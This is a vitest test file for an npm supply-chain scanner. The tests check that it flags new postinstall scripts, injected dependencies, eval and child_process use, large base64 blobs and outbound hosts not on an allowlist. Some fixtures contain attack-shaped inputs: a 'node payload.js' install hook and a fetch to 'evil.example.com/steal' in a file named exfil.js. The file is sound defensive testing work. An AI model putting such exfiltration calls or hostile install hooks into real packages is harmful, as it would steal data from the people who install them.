// ABOUTME: Critical tests for #1647 — local diff + static-check scanner.
// ABOUTME: Locks the gate behavior; no live npm pack / no network in tests.

import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

const modulePath = new URL(
  "../../bin/browser-local/cli-scanner.mjs",
  import.meta.url,
).href;
const {
  buildPackageSnapshot,
  diffSnapshots,
  runStaticChecks,
} = await import(/* @vite-ignore */ modulePath);

let tempRoot: string;

beforeEach(() => {
  tempRoot = mkdtempSync(path.join(tmpdir(), "seren-cli-scanner-test-"));
});

afterEach(() => {
  rmSync(tempRoot, { recursive: true, force: true });
});

function writePackage(files: Record<string, string>) {
  const pkgDir = path.join(tempRoot, "package");
  mkdirSync(pkgDir, { recursive: true });
  for (const [rel, contents] of Object.entries(files)) {
    const abs = path.join(pkgDir, rel);
    mkdirSync(path.dirname(abs), { recursive: true });
    writeFileSync(abs, contents, "utf8");
  }
  return pkgDir;
}

describe("buildPackageSnapshot", () => {
  it("captures install scripts, declared deps, files, and hashes", () => {
    const pkgDir = writePackage({
      "package.json": JSON.stringify({
        name: "@test/x",
        version: "1.0.0",
        scripts: { postinstall: "node setup.js", build: "tsc" },
        dependencies: { foo: "1.0.0", bar: "^2.0.0" },
      }),
      "dist/index.js": "module.exports = {};",
    });
    const snap = buildPackageSnapshot(pkgDir);
    expect(snap.version).toBe("1.0.0");
    expect(snap.installScripts).toEqual({ postinstall: "node setup.js" });
    expect(snap.declaredDependencies).toEqual(["bar", "foo"]);
    expect(snap.files).toContain("package.json");
    expect(snap.files).toContain("dist/index.js");
    expect(typeof snap.fileHashes["package.json"]).toBe("string");
  });
});

describe("diffSnapshots — the axios pattern", () => {
  const baseline = {
    installScripts: {},
    declaredDependencies: ["foo"],
    files: ["package.json", "dist/index.js"],
    fileHashes: { "package.json": "h1", "dist/index.js": "h2" },
  };

  it("flags a newly-introduced postinstall script — exactly the axios attack pattern", () => {
    const candidate = {
      installScripts: { postinstall: "node payload.js" },
      declaredDependencies: ["foo"],
      files: ["package.json", "dist/index.js"],
      fileHashes: { "package.json": "h1-changed", "dist/index.js": "h2" },
    };
    expect(diffSnapshots(baseline, candidate)).toContain(
      "new_install_script:postinstall",
    );
  });

  it("flags a newly-added runtime dependency — Shai-Hulud / axios style dep injection", () => {
    const candidate = {
      installScripts: {},
      declaredDependencies: ["foo", "plain-crypto-js"],
      files: baseline.files,
      fileHashes: baseline.fileHashes,
    };
    expect(diffSnapshots(baseline, candidate)).toContain(
      "new_dependency:plain-crypto-js",
    );
  });

  it("flags a new top-level file or new file in an entry-point directory", () => {
    const candidate = {
      installScripts: {},
      declaredDependencies: ["foo"],
      files: [...baseline.files, "stealth.js", "dist/payload.js"],
      fileHashes: { ...baseline.fileHashes, "stealth.js": "h3", "dist/payload.js": "h4" },
    };
    const flags = diffSnapshots(baseline, candidate);
    expect(flags).toContain("new_file:stealth.js");
    expect(flags).toContain("new_file:dist/payload.js");
  });

  it("does not flag dep removals or non-entry-point new files — those are not the attack pattern", () => {
    const candidate = {
      installScripts: {},
      declaredDependencies: [],
      files: [...baseline.files, "test/extra.spec.js"],
      fileHashes: { ...baseline.fileHashes, "test/extra.spec.js": "h5" },
    };
    const flags = diffSnapshots(baseline, candidate);
    expect(flags).not.toContain("new_dependency:foo");
    expect(flags).not.toContain("new_file:test/extra.spec.js");
  });

  it("returns an empty array for a clean version bump (same scripts, deps, files)", () => {
    expect(diffSnapshots(baseline, baseline)).toEqual([]);
  });
});

describe("runStaticChecks — the chalk/debug pattern", () => {
  it("flags eval(), new Function(), and dynamic require — code-injection markers", () => {
    const pkgDir = writePackage({
      "package.json": JSON.stringify({ name: "x", version: "1.0.0" }),
      "lib/a.js": "module.exports = function() { eval('1+1'); };",
      "lib/b.js": "const f = new Function('return 1');",
      "lib/c.js": "const r = require(name);",
    });
    const flags = runStaticChecks(pkgDir);
    expect(flags.some((f: string) => f.startsWith("eval_call:lib/a.js"))).toBe(true);
    expect(flags.some((f: string) => f.startsWith("new_function:lib/b.js"))).toBe(
      true,
    );
    expect(
      flags.some((f: string) => f.startsWith("dynamic_require:lib/c.js")),
    ).toBe(true);
  });

  it("flags newly-introduced child_process imports — Shai-Hulud bundles often add this", () => {
    const pkgDir = writePackage({
      "package.json": JSON.stringify({ name: "x", version: "1.0.0" }),
      "lib/x.js": 'const cp = require("child_process");',
    });
    // Baseline did not have this file at all.
    const flags = runStaticChecks(pkgDir, { baseline: { fileHashes: {} } });
    expect(
      flags.some((f: string) => f.startsWith("child_process_in_new_file:lib/x.js")),
    ).toBe(true);
  });

  it("flags large base64 literals — payload smuggling marker", () => {
    const big = "A".repeat(3000);
    const pkgDir = writePackage({
      "package.json": JSON.stringify({ name: "x", version: "1.0.0" }),
      "lib/p.js": `module.exports = "${big}";`,
    });
    const flags = runStaticChecks(pkgDir);
    expect(
      flags.some((f: string) => f.startsWith("large_base64_literal:lib/p.js")),
    ).toBe(true);
  });

  it("clean readable JS produces no flags — keeps false-positive rate low", () => {
    const pkgDir = writePackage({
      "package.json": JSON.stringify({ name: "x", version: "1.0.0" }),
      "lib/clean.js": "module.exports = function add(a, b) { return a + b; };",
    });
    expect(runStaticChecks(pkgDir)).toEqual([]);
  });

  it("does NOT flag .js / .mjs / .cjs filenames as unallowed hosts (#1649 review P1)", () => {
    // The original bare-TLD regex matched 'index.js', 'cli.cjs', 'foo.mjs'
    // as hosts, locking ESM packages into permanent scan_rejected state.
    // The URL-only regex must NOT match these.
    const pkgDir = writePackage({
      "package.json": JSON.stringify({ name: "x", version: "1.0.0" }),
      "lib/loader.js":
        "import x from './index.js';\nconst y = require('./cli.cjs');\nexport * from './foo.mjs';",
    });
    const flags = runStaticChecks(pkgDir, {
      hostnameAllowlist: ["openai.com"],
      baseline: { fileHashes: {} },
    });
    expect(flags.filter((f: string) => f.startsWith("unallowed_host:"))).toEqual(
      [],
    );
  });

  it("flags an actual outbound URL host that is not on the allowlist", () => {
    const pkgDir = writePackage({
      "package.json": JSON.stringify({ name: "x", version: "1.0.0" }),
      "lib/exfil.js": 'fetch("https://evil.example.com/steal");',
    });
    const flags = runStaticChecks(pkgDir, {
      hostnameAllowlist: ["openai.com"],
      baseline: { fileHashes: {} },
    });
    expect(
      flags.some((f: string) =>
        f.startsWith("unallowed_host:lib/exfil.js:evil.example.com"),
      ),
    ).toBe(true);
  });

  it("does NOT re-flag an unallowed host in a file whose content didn't change vs baseline (#1649 review P1)", async () => {
    // Even if the host was somehow flagged once, an unchanged file must
    // not lock the package into permanent scan_rejected state on every
    // subsequent update.
    const pkgDir = writePackage({
      "package.json": JSON.stringify({ name: "x", version: "1.0.0" }),
      "lib/u.js": 'fetch("https://evil.example.com/steal");',
    });
    const moduleUrl = new URL(
      "../../bin/browser-local/cli-scanner.mjs",
      import.meta.url,
    ).href;
    const { computeSha512 } = await import(/* @vite-ignore */ moduleUrl);
    const baselineHash = computeSha512(path.join(pkgDir, "lib/u.js"));
    const flags = runStaticChecks(pkgDir, {
      hostnameAllowlist: ["openai.com"],
      baseline: { fileHashes: { "lib/u.js": baselineHash } },
    });
    expect(
      flags.filter((f: string) => f.startsWith("unallowed_host:")),
    ).toEqual([]);
  });
});

describe("baseline seeding (#1649 review P0)", () => {
  // findGlobalPackageDirectory + buildBaselineFromInstalled make a network
  // call (`npm root -g`); we don't drive npm in unit tests. The integration
  // assertion that matters is exercised in the updater's failure-paths
  // suite (#1645): when seed returns null, the updater must refuse to
  // install rather than fall through to no_baseline. That guarantees no
  // existing user runs an unscanned first published-tarball update.
  it("buildBaselineFromInstalled is exported for the updater to call before scanning", async () => {
    const moduleUrl = new URL(
      "../../bin/browser-local/cli-scanner.mjs",
      import.meta.url,
    ).href;
    const { buildBaselineFromInstalled } = await import(
      /* @vite-ignore */ moduleUrl
    );
    expect(typeof buildBaselineFromInstalled).toBe("function");
  });
});
